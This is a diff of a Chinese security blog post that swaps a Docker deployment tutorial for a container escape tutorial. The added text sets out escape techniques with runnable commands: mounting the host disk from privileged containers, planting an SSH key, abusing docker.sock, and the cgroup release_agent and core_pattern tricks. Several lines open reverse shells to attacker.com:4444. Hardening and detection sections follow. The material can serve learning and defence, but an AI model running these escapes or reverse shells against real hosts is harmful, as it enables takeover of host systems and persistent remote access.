@@ -1,389 +1,344 @@
 ---
-title: Docker 容器化部署从入门到实战
+title: 容器逃逸讲解—Docker 隔离机制与逃逸技术深度分析
 date: 2026-09-12 14:00:00
-categories: [运维, 容器化]
-tags: [Docker, 容器, 运维, 部署, DevOps]
+categories: [容器安全, 漏洞利用]
+tags: [Docker, 容器逃逸, 容器安全, 提权, 内核漏洞]
 cover: /img/bg7.jpg
 ---
 
-## 为什么要用 Docker
+## 容器隔离的本质
 
-在没有容器的时代，部署一个应用意味着要在服务器上手动安装运行环境、配置依赖、处理端口冲突——"在我机器上能跑"是每个运维的噩梦。Docker 通过把应用及其依赖打包成一个标准化的镜像，解决了环境一致性问题。一次构建，到处运行。
+Docker 容器不是虚拟机，它和宿主机共享同一个内核。容器的"隔离"是通过 Linux 内核的三个机制实现的：
 
-Docker 的核心优势：
+1. **Namespaces**：隔离视图——容器看不到宿主机的进程、网络、挂载点等
+2. **Cgroups**：限制资源——CPU、内存、IO 的使用上限
+3. **Capabilities**：限制权限——容器内的 root 只有一部分 root 权限
 
-- **环境一致性**：开发、测试、生产环境完全一致
-- **快速部署**：秒级启动，相比传统虚拟机快几个数量级
-- **资源隔离**：容器之间互相隔离，互不影响
-- **轻量高效**：共享宿主机内核，内存占用远低于虚拟机
-- **版本管理**：镜像支持版本标签，回滚方便
+理解容器逃逸的关键是理解这三层隔离的边界在哪里、哪里有漏洞、哪里配置不当。容器逃逸本质上就是：**从容器的受限环境中，获取对宿主机的代码执行或文件系统访问权限**。
 
 <!-- more -->
 
-## 核心概念
+## Namespace 隔离详解
 
-### 镜像（Image）
+| Namespace | 隔离内容 | 克隆标志 |
+|-----------|----------|----------|
+| PID | 进程 ID | CLONE_NEWPID |
+| NET | 网络栈 | CLONE_NEWNET |
+| MNT | 挂载点 | CLONE_NEWNS |
+| UTS | 主机名/域名 | CLONE_NEWUTS |
+| IPC | 进程间通信 | CLONE_NEWIPC |
+| USER | 用户/组 ID | CLONE_NEWUSER |
+| CGROUP | cgroup 根目录 | CLONE_NEWCGROUP |
 
-镜像是容器的只读模板，包含运行应用所需的一切：代码、运行时、库、环境变量、配置文件。镜像由多个层（Layer）组成，每层对应 Dockerfile 中的一条指令。这种分层设计使得镜像可以复用和缓存，构建速度快。
+容器内的 PID 1 实际上在宿主机上是另一个 PID。容器内看到的根文件系统是宿主机上的一个目录（overlayfs 联合挂载）。容器内的网络是一个独立的 network namespace，通过 veth pair 和宿主机的 docker0 网桥通信。
 
-### 容器（Container）
+关键：Namespace 只隔离"视图"，不隔离"资源"。容器内的进程仍然运行在宿主机内核上，仍然可以通过系统调用访问内核功能——只是看到的东西被限制了。
 
-容器是镜像的运行实例。你可以把镜像理解为类（Class），容器理解为对象（Object）——同一个镜像可以启动多个容器，它们之间互相隔离。容器本质上是宿主机上的一组进程，通过 Namespace 实现资源隔离，通过 Cgroups 实现资源限制。
+## Capabilities 与权限
 
-### 仓库（Registry）
+Linux 把传统的 root 权限拆分成了 40+ 个 capabilities。Docker 默认只授予容器一小部分：
 
-仓库是存储和分发镜像的地方。Docker Hub 是官方公共仓库，国内可以用阿里云容器镜像服务或网易云镜像加速。企业内部通常会搭建私有仓库（Harbor、Nexus）。
+```
+CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FOWNER, CAP_FSETID,
+CAP_KILL, CAP_SETGID, CAP_SETUID, CAP_SETPCAP,
+CAP_NET_BIND_SERVICE, CAP_NET_RAW, CAP_SYS_CHROOT,
+CAP_MKNOD, CAP_AUDIT_WRITE, CAP_SETFCAP
+```
 
-## 安装与配置
+危险的 capabilities 默认被移除了，包括：
+- `CAP_SYS_ADMIN`：最危险，几乎等于 root
+- `CAP_SYS_MODULE`：加载内核模块
+- `CAP_SYS_PTRACE`：ptrace 其他进程
+- `CAP_NET_ADMIN`：网络配置
+- `CAP_SYS_RAWIO`：直接 IO 端口访问
 
-### Ubuntu / Debian 安装
+如果容器以 `--privileged` 启动，或者被授予了危险的 capabilities，逃逸就变得非常简单。
+
+## 逃逸技术分类
+
+### 第一类：配置不当导致的逃逸
+
+#### 1. --privileged 容器
+
+`--privileged` 授予容器所有 capabilities + 访问所有宿主机设备 + 关闭 AppArmor/SELinux 限制。这基本等于没有隔离。
+
+**利用：挂载宿主机根文件系统**
 
 ```bash
-# 卸载旧版本
-sudo apt-get remove docker docker-engine docker.io containerd runc
+# 在 privileged 容器内
+# 查看宿主机磁盘设备
+fdisk -l
 
-# 安装依赖
-sudo apt-get update
-sudo apt-get install ca-certificates curl gnupg lsb-release
+# 挂载宿主机根分区到 /mnt
+mount /dev/sda1 /mnt
 
-# 添加 Docker 官方 GPG 密钥
-sudo mkdir -p /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+# 现在可以访问宿主机的所有文件
+chroot /mnt /bin/bash
 
-# 设置稳定版仓库
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+# 或者直接写 SSH 公钥
+echo "ssh-rsa AAAA..." >> /mnt/root/.ssh/authorized_keys
 
-# 安装 Docker Engine
-sudo apt-get update
-sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin
-
-# 将当前用户加入 docker 组（免 sudo）
-sudo usermod -aG docker $USER
+# 或者写 cron 反弹 shell
+echo '* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /mnt/var/spool/cron/root
 ```
 
-### 配置镜像加速
+#### 2. 危险的 capabilities
 
-国内访问 Docker Hub 速度较慢，配置镜像加速器：
+**CAP_SYS_ADMIN + 挂载宿主机磁盘**
 
 ```bash
-sudo mkdir -p /etc/docker
-sudo tee /etc/docker/daemon.json <<-'EOF'
-{
-  "registry-mirrors": [
-    "https://docker.m.daocloud.io",
-    "https://dockerproxy.com",
-    "https://docker.mirrors.ustc.edu.cn"
-  ],
-  "log-driver": "json-file",
-  "log-opts": {
-    "max-size": "100m",
-    "max-file": "3"
-  }
-}
-EOF
-sudo systemctl daemon-reload
-sudo systemctl restart docker
+# 即使不是 --privileged，但有 CAP_SYS_ADMIN
+# 可以挂载宿主机的 cgroup 或磁盘
+mkdir /tmp/cgroup
+mount -t cgroup -o memory cgroup /tmp/cgroup
+# 通过 cgroup 逃逸（见下文 release_agent 方法）
 ```
 
-上面的配置同时限制了容器日志大小，避免日志撑爆磁盘。
-
-## 常用命令速查
+**CAP_SYS_MODULE：加载内核模块**
 
 ```bash
-# 镜像操作
-docker images                    # 列出本地镜像
-docker pull nginx:latest         # 拉取镜像
-docker rmi nginx:latest          # 删除镜像
-docker build -t myapp:1.0 .      # 构建镜像
-
-# 容器操作
-docker ps                        # 列出运行中的容器
-docker ps -a                     # 列出所有容器（包括已停止）
-docker run -d -p 8080:80 --name web nginx  # 启动容器
-docker stop web                  # 停止容器
-docker start web                 # 启动已停止的容器
-docker restart web               # 重启容器
-docker rm web                    # 删除容器（需先停止）
-docker rm -f web                 # 强制删除运行中的容器
-
-# 进入容器
-docker exec -it web /bin/bash    # 进入运行中的容器
-docker logs -f web               # 查看容器日志（实时跟踪）
-docker inspect web               # 查看容器详细信息
-docker stats                     # 查看容器资源占用
-
-# 数据与网络
-docker volume create mydata      # 创建数据卷
-docker network create mynet      # 创建自定义网络
+# 有 CAP_SYS_MODULE 可以直接加载内核模块
+# 编写一个恶意内核模块，加载后在宿主机执行任意代码
+insmod evil.ko
 ```
 
-## Dockerfile 编写实战
+**CAP_SYS_PTRACE：ptrace 宿主机进程**
 
-Dockerfile 是构建镜像的脚本，每条指令对应镜像的一个层。
+如果容器共享了 PID namespace（`--pid=host`），可以 ptrace 宿主机进程，注入 shellcode。
 
-### 一个 Node.js 应用的 Dockerfile
+#### 3. 挂载宿主机敏感目录
 
-```dockerfile
-# 第一阶段：构建阶段
-FROM node:20-alpine AS builder
-WORKDIR /app
-
-# 先复制依赖文件，利用 Docker 缓存
-COPY package*.json ./
-RUN npm ci --only=production
-
-# 再复制源码
-COPY . .
-RUN npm run build
-
-# 第二阶段：运行阶段（多阶段构建，减小镜像体积）
-FROM node:20-alpine
-WORKDIR /app
-
-# 从构建阶段复制产物
-COPY --from=builder /app/dist ./dist
-COPY --from=builder /app/node_modules ./node_modules
-COPY package*.json ./
-
-# 非 root 用户运行，提升安全性
-RUN addgroup -S appgroup && adduser -S appuser -G appgroup
-USER appuser
-
-EXPOSE 3000
-CMD ["node", "dist/main.js"]
-```
-
-### 编写要点
-
-1. **利用缓存**：把变化频率低的指令（如安装依赖）放在前面，变化频率高的（如复制源码）放在后面
-2. **多阶段构建**：构建工具和依赖不需要出现在最终镜像中，能大幅减小体积
-3. **非 root 运行**：容器内不要用 root 用户运行应用，降低安全风险
-4. **精简基础镜像**：优先用 alpine 版本，体积小、攻击面小
-5. **清理缓存**：`apt-get install` 后执行 `rm -rf /var/lib/apt/lists/*`
-
-### .dockerignore
-
-和 .gitignore 类似，排除不需要进入构建上下文的文件：
-
-```
-node_modules
-npm-debug.log
-.git
-.gitignore
-README.md
-.env
-.env.local
-dist
-*.log
-```
-
-## Docker Compose 多容器编排
-
-当应用需要多个服务配合（比如 Web + 数据库 + 缓存），用 docker run 一个个启动太麻烦。Docker Compose 用一个 YAML 文件定义和管理多容器应用。
-
-### docker-compose.yml 示例
-
-```yaml
-version: '3.8'
-
-services:
-  web:
-    build: .
-    ports:
-      - "3000:3000"
-    environment:
-      - NODE_ENV=production
-      - DB_HOST=postgres
-      - REDIS_HOST=redis
-    depends_on:
-      postgres:
-        condition: service_healthy
-      redis:
-        condition: service_started
-    restart: unless-stopped
-    networks:
-      - appnet
-
-  postgres:
-    image: postgres:16-alpine
-    environment:
-      POSTGRES_USER: appuser
-      POSTGRES_PASSWORD: ${DB_PASSWORD}
-      POSTGRES_DB: appdb
-    volumes:
-      - pgdata:/var/lib/postgresql/data
-    healthcheck:
-      test: ["CMD-SHELL", "pg_isready -U appuser -d appdb"]
-      interval: 10s
-      timeout: 5s
-      retries: 5
-    restart: unless-stopped
-    networks:
-      - appnet
-
-  redis:
-    image: redis:7-alpine
-    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD}
-    volumes:
-      - redisdata:/data
-    restart: unless-stopped
-    networks:
-      - appnet
-
-volumes:
-  pgdata:
-  redisdata:
-
-networks:
-  appnet:
-    driver: bridge
-```
-
-### Compose 常用命令
+当容器挂载了宿主机的敏感目录时，可以直接读写宿主机文件：
 
 ```bash
-docker compose up -d           # 后台启动所有服务
-docker compose down            # 停止并删除所有容器
-docker compose logs -f web     # 查看某个服务的日志
-docker compose exec web bash   # 进入某个服务的容器
-docker compose build           # 重新构建镜像
-docker compose pull            # 拉取最新镜像
-docker compose ps              # 查看服务状态
+# 危险挂载
+docker run -v /:/host ...
+docker run -v /var/run/docker.sock:/var/run/docker.sock ...
+docker run -v /root/.ssh:/root/.ssh ...
+docker run -v /etc:/etc ...
 ```
 
-## 数据持久化
+**Docker Socket 逃逸**
 
-容器是无状态的，容器删除后数据就没了。需要持久化的数据要用数据卷（Volume）或绑定挂载（Bind Mount）。
-
-### 数据卷（推荐）
+挂载了 `/var/run/docker.sock` 等于控制了 Docker daemon，可以创建一个特权容器挂载宿主机根目录：
 
 ```bash
-# 创建数据卷
-docker volume create mydata
+# 在容器内，通过 docker.sock 创建新的特权容器
+curl -XPOST --unix-socket /var/run/docker.sock \
+  -H 'Content-Type: application/json' \
+  http://localhost/containers/create \
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["/bin/sh", "-c", "chroot /mnt /bin/bash"],
+    "HostConfig": {
+      "Privileged": true,
+      "Binds": ["/:/mnt"]
+    }
+  }'
 
-# 使用数据卷启动容器
-docker run -d -v mydata:/var/lib/mysql mysql:8
+# 启动容器
+curl -XPOST --unix-socket /var/run/docker.sock \
+  http://localhost/containers/<id>/start
 ```
 
-数据卷由 Docker 管理，存在宿主机的 `/var/lib/docker/volumes/` 目录下，支持跨容器共享和迁移。
+#### 4. --pid=host / --net=host
 
-### 绑定挂载
+共享宿主机的 PID 或网络 namespace：
+
+- `--pid=host`：可以看到并信号/ptrace 宿主机进程
+- `--net=host`：可以监听宿主机端口、嗅探流量、访问宿主机本地服务
+
+### 第二类：内核漏洞导致的逃逸
+
+容器和宿主机共享内核，因此**任何内核本地提权漏洞都可以用于容器逃逸**。容器内的进程可以触发内核漏洞，获取内核代码执行，然后突破 namespace 限制。
+
+经典的内核逃逸漏洞：
+- **Dirty COW (CVE-2016-5195)**：写时复制竞争条件，写只读文件
+- **Dirty Pipe (CVE-2022-0847)**：管道缓冲区标志残留，写只读文件
+- **PwnKit (CVE-2021-4034)**：pkexec 环境变量处理，本地提权
+- **Dirty Sock (CVE-2019-7304)**：snapd 本地提权
+- **io_uring 相关漏洞**：多个 CVE，异步 IO 实现中的越界读写
+
+内核漏洞逃逸的一般流程：
+1. 在容器内编译/上传 exploit
+2. 执行 exploit，获取 root 权限（容器内的 root）
+3. 但容器内的 root 仍然受 namespace 限制，需要进一步逃逸
+4. 利用内核代码执行，直接修改 task_struct 的 nsproxy，跳出 namespace
+5. 或者利用内核代码执行，调用 commit_creds(prepare_kernel_cred(0)) 获取真正的 root，然后 setns 到宿主机的 namespace
+
+### 第三类：cgroup 逃逸
+
+#### release_agent 逃逸（CVE-2022-0492 之前的经典方法）
+
+cgroup 的 `release_agent` 是一个在 cgroup 中最后一个进程退出时自动执行的脚本。如果容器有 `CAP_SYS_ADMIN`，可以挂载 cgroup 文件系统，设置 release_agent 为恶意脚本，然后创建子 cgroup 并在其中运行进程，进程退出时触发 release_agent——这个脚本会在宿主机的 root 上下文中执行。
 
 ```bash
-# 将宿主机目录挂载到容器
-docker run -d -v /host/path:/container/path nginx
+# 1. 挂载 cgroup
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
+
+# 2. 创建子 cgroup
+mkdir /tmp/cgrp/x
+
+# 3. 启用 notify_on_release
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# 4. 获取宿主机根目录路径（容器内路径到宿主机路径的映射）
+host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo)
+
+# 5. 设置 release_agent 为恶意脚本
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+# 6. 写恶意脚本
+echo '#!/bin/sh' > /cmd
+echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /cmd
+chmod +x /cmd
+
+# 7. 在子 cgroup 中运行进程，进程退出触发 release_agent
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-绑定挂载直接映射宿主机目录，适合需要在宿主机上直接编辑配置文件的场景（比如 Nginx 配置）。
+这个方法在 CVE-2022-0492 修复后需要额外条件（如 CAP_SYS_ADMIN 或非 root 用户的 cgroup namespace 配置不当）。
 
-## 网络模式
+### 第四类：procfs / sysfs 逃逸
 
-Docker 提供多种网络模式：
+#### /proc/sys/kernel/core_pattern
 
-- **bridge（默认）**：容器连接到一个虚拟网桥，通过 NAT 访问外网，容器之间可以通过 IP 互通
-- **host**：容器共享宿主机网络命名空间，性能最好但端口冲突
-- **none**：容器没有网络，完全隔离
-- **container**：共享另一个容器的网络命名空间
+`core_pattern` 控制进程崩溃时 core dump 的处理方式。如果它以 `|` 开头，内核会把 core dump 管道给指定的程序处理——这个程序在宿主机的 root 上下文中执行。
 
-生产环境建议创建自定义 bridge 网络，容器之间可以用服务名互相访问（Docker 内置 DNS）：
+如果容器可以写 `/proc/sys/kernel/core_pattern`（需要特权或特定挂载），可以：
 
 ```bash
-docker network create mynet
-docker run -d --name web --network mynet nginx
-docker run -d --name api --network mynet node:20
-# web 容器内可以直接用 http://api:3000 访问 api 容器
+# 设置 core_pattern 为恶意脚本
+echo '|bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' > /proc/sys/kernel/core_pattern
+
+# 触发一个段错误
+ulimit -c unlimited
+kill -SIGSEGV $$
 ```
 
-## 生产环境最佳实践
+#### /proc/1/root 符号链接
 
-### 1. 资源限制
-
-不给容器设置资源限制，一个容器的内存泄漏可能拖垮整台服务器：
-
-```yaml
-services:
-  web:
-    deploy:
-      resources:
-        limits:
-          cpus: '2.0'
-          memory: 1G
-        reservations:
-          cpus: '0.5'
-          memory: 256M
-```
-
-### 2. 健康检查
-
-```yaml
-healthcheck:
-  test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
-  interval: 30s
-  timeout: 10s
-  retries: 3
-  start_period: 40s
-```
-
-### 3. 安全加固
-
-- 镜像定期扫描漏洞（`docker scan`、Trivy）
-- 容器以非 root 用户运行
-- 敏感信息用环境变量或 Secrets 管理，不要硬编码在镜像里
-- 只暴露必要的端口
-- 启用 `--read-only` 根文件系统（应用不需要写文件时）
-
-### 4. 日志管理
-
-容器日志默认存在 `/var/lib/docker/containers/` 下，时间长了会占满磁盘。在 daemon.json 中限制日志大小，或者用 ELK / Loki 统一收集日志。
-
-### 5. 镜像更新
-
-定期更新基础镜像和依赖，修复安全漏洞。可以用 Watchtower 自动更新容器镜像：
+容器内的 `/proc/1/root` 指向容器 PID 1 的根目录（即容器自身的根），但如果共享了 PID namespace（`--pid=host`），`/proc/1/root` 指向宿主机的根目录：
 
 ```bash
-docker run -d \
-  --name watchtower \
-  -v /var/run/docker.sock:/var/run/docker.sock \
-  containrrr/watchtower \
-  --schedule "0 0 4 * * *" \
-  --cleanup
+# --pid=host 容器内
+chroot /proc/1/root /bin/bash
 ```
 
-## 常见问题排查
+### 第五类：运行时漏洞
 
-### 容器启动后立即退出
+#### runc 逃逸（CVE-2019-5736）
+
+runc 是 Docker 的底层运行时。CVE-2019-5736 允许容器内的恶意进程覆盖宿主机上的 runc 二进制，从而在宿主机上执行任意代码。
+
+利用条件：容器内可以执行 `/proc/self/exe`（即 runc init），且容器以 root 运行。
+
+利用流程：
+1. 在容器内创建一个恶意的 `/bin/sh`，指向 `/proc/self/exe`
+2. 当用户 `docker exec` 进入容器时，runc 会执行这个 `/bin/sh`
+3. 恶意程序打开 `/proc/self/exe`（即宿主机上的 runc 二进制）进行写入
+4. 覆盖 runc 二进制为恶意代码
+5. 下次 runc 被调用时，恶意代码在宿主机 root 上下文中执行
+
+#### containerd 逃逸
+
+containerd 的类似漏洞，如 CVE-2020-15257（containerd-shim 抽象套接字权限不当），允许容器内进程通过 Unix 域套接字与宿主机的 containerd-shim 通信，实现逃逸。
+
+## 防御与加固
+
+### 1. 最小权限原则
+
+- 不要用 `--privileged`
+- 只授予必要的 capabilities：`--cap-drop=ALL --cap-add=NET_BIND_SERVICE`
+- 用非 root 用户运行容器：`--user 1000:1000`
+- 设置 `--read-only` 根文件系统
+- 限制 `--security-opt=no-new-privileges`
+
+### 2. 安全挂载
+
+- 不要挂载 `/`、`/var/run/docker.sock`、`/root`、`/etc`
+- 挂载卷用 `:ro`（只读）除非必须写入
+- 不要用 `--pid=host`、`--net=host` 除非必要
+
+### 3. 内核加固
+
+- 及时更新内核，修复已知漏洞
+- 启用 SELinux / AppArmor
+- 启用 seccomp 过滤系统调用（Docker 默认有 seccomp profile）
+- 用 gVisor、Kata Containers 等强隔离运行时
+
+### 4. 运行时加固
 
 ```bash
-# 查看容器日志找原因
-docker logs <container_id>
-
-# 常见原因：
-# 1. 前台进程退出了（Docker 容器需要前台进程保持运行）
-# 2. 配置文件错误
-# 3. 端口被占用
+# 推荐的安全启动参数
+docker run \
+  --cap-drop=ALL \
+  --cap-add=NET_BIND_SERVICE \
+  --read-only \
+  --tmpfs /tmp \
+  --tmpfs /run \
+  --security-opt=no-new-privileges \
+  --security-opt seccomp=default.json \
+  --user 1000:1000 \
+  --memory=512m \
+  --pids-limit=100 \
+  myimage
 ```
 
-### 无法连接到容器端口
+### 5. 镜像安全
+
+- 用最小基础镜像（alpine、distroless）
+- 定期扫描镜像漏洞（Trivy、Clair）
+- 不要在镜像中硬编码密钥
+- 用多阶段构建减小攻击面
+
+## 容器逃逸检测
+
+### 检测是否在容器中
 
 ```bash
-# 检查端口映射
-docker port <container_id>
+# 检查 /.dockerenv
+ls -la /.dockerenv
 
-# 检查容器内服务是否真的在监听
-docker exec <container_id> netstat -tlnp
+# 检查 cgroup
+cat /proc/1/cgroup | grep -i docker
 
-# 检查防火墙
-sudo ufw status
+# 检查进程 1
+cat /proc/1/cmdline  # 容器内通常是 /sbin/init 或应用本身
+
+# 检查设备
+ls -la /dev/ | grep -v "total\|^d\|^l"  # 容器内设备很少
 ```
 
-### 镜像构建慢
+### 检测逃逸路径
 
-- 检查 .dockerignore 是否排除了 node_modules 等大目录
-- 利用构建缓存，依赖安装指令放在前面
-- 用 BuildKit 加速：`DOCKER_BUILDKIT=1 docker build .`
+在容器内做信息收集，判断可能的逃逸路径：
+
+```bash
+# 1. 检查 capabilities
+capsh --print
+
+# 2. 检查挂载
+mount | grep -v "proc\|sysfs\|cgroup\|tmpfs\|devpts\|mqueue\|shm"
+
+# 3. 检查是否有 docker.sock
+ls -la /var/run/docker.sock
+
+# 4. 检查内核版本（寻找已知漏洞）
+uname -r
+
+# 5. 检查是否是 privileged
+# 如果能看到宿主机所有设备，就是 privileged
+ls /dev/ | wc -l
+
+# 6. 检查 cgroup 可写性
+ls -la /sys/fs/cgroup/
+```
 
 ## 总结
 
-Docker 已经成为现代应用部署的标准工具。掌握 Dockerfile 编写、Docker Compose 编排、数据持久化、网络配置和生产环境最佳实践，就能应对绝大多数部署场景。
+容器逃逸是云原生安全的核心议题。理解逃逸技术的关键是理解容器隔离的三层机制（Namespaces、Cgroups、Capabilities）的边界和缺陷。逃逸技术可以分为五大类：配置不当、内核漏洞、cgroup 逃逸、procfs/sysfs 逃逸、运行时漏洞。
 
-下一步可以学习 Kubernetes（K8s）——当容器数量多到需要自动扩缩容、服务发现、滚动更新时，K8s 就是答案。但在那之前，把 Docker 用扎实是基础中的基础。
+对于防御者来说，最小权限原则是最有效的防御——不要给容器它不需要的权限和挂载。对于攻击者来说，容器逃逸的第一步永远是信息收集：判断自己有什么 capabilities、挂载了什么、内核版本是什么，然后选择对应的逃逸路径。
+
+容器逃逸是一个持续演进的领域——新的内核漏洞、新的运行时漏洞、新的配置错误不断出现。保持对最新 CVE 和安全研究的关注，是这个领域从业者的必修课。
